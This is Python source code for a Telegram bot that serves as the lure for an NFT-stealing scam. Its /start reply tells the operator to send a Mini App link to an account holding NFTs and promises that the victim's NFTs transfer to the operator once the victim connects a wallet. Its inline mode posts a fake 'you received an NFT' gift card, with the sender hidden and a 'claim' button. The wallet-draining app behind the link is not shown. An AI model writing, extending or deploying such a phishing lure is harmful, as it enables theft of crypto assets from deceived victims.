import os
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InlineQueryResultArticle, InputTextMessageContent, WebAppInfo
from telegram.ext import Application, CommandHandler, ContextTypes, InlineQueryHandler
from dotenv import load_dotenv

load_dotenv()

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
MINI_APP_URL = os.getenv("MINI_APP_URL", "https://yourdomain.com")
BOT_USERNAME = os.getenv("BOT_USERNAME", "IncognitoGiftsBot")
APP_SHORT_NAME = os.getenv("APP_SHORT_NAME", "incognitogifts")

if not BOT_TOKEN:
    raise ValueError("TELEGRAM_BOT_TOKEN не установлен в переменных окружения")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id

    logger.info(f"Пользователь {user_id} ({user.username}) запустил бота")

    # Официальная ссылка на Mini App с красивым preview
    mini_app_link = f"https://t.me/{BOT_USERNAME}/{APP_SHORT_NAME}?startapp={user_id}"

    message_text = (
        f"🎁 **Получить Telegram NFT**\n\n"
        f"Отправь эту ссылку на аккаунт с NFT:\n"
        f"{mini_app_link}\n\n"
        f"💎 Все NFT автоматически перейдут на твой аккаунт **{user.first_name}**\n\n"
        f"_При открытии ссылки - подключи кошелёк и NFT моментально переведутся!_"
    )

    # Кнопка с прямой ссылкой на Mini App
    keyboard = [
        [InlineKeyboardButton("🎁 Открыть приложение", url=mini_app_link)]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        message_text,
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "🦦 **Telegram NFT Transfer Bot**\n\n"
        "**Команды:**\n"
        "/start - Получить ссылку для перевода NFT\n"
        "/help - Показать это сообщение\n\n"
        "**Inline Mode:**\n"
        "Напиши `@IncognitoGiftsBot` в любом чате чтобы отправить красивую карточку с NFT!"
    )
    await update.message.reply_text(help_text, parse_mode='Markdown')

async def inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обрабатывает inline запросы - показывает красивую карточку с GIF"""
    user_id = update.inline_query.from_user.id

    # Ссылка на Mini App
    mini_app_link = f"https://t.me/{BOT_USERNAME}/{APP_SHORT_NAME}?startapp={user_id}"

    # TODO: Заменить на реальное название NFT и номер
    nft_name = "Lol Pop #130400"

    # TODO: Заменить на публичный URL GIF (загрузи на imgur.com)
    gif_url = "https://nft.fragment.com/telegram.gif"

    # Создаём красивую карточку с кнопкой
    keyboard = [
        [InlineKeyboardButton("Забрать", url=mini_app_link)]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    # Результат с текстом и кнопкой
    results = [
        InlineQueryResultArticle(
            id="nft_gift",
            title="🎁 Отправить Telegram NFT",
            description="Получатель сможет забрать NFT одной кнопкой",
            thumbnail_url=gif_url,
            input_message_content=InputTextMessageContent(
                message_text=(
                    f"Вам отправлен Telegram NFT: **{nft_name}**\n\n"
                    f"От: **Аккаунт скрыт**"
                ),
                parse_mode='Markdown'
            ),
            reply_markup=reply_markup
        )
    ]

    await update.inline_query.answer(results, cache_time=1)

def main():
    logger.info("Запуск бота...")

    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(InlineQueryHandler(inline_query))

    logger.info("Бот запущен и готов к работе!")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
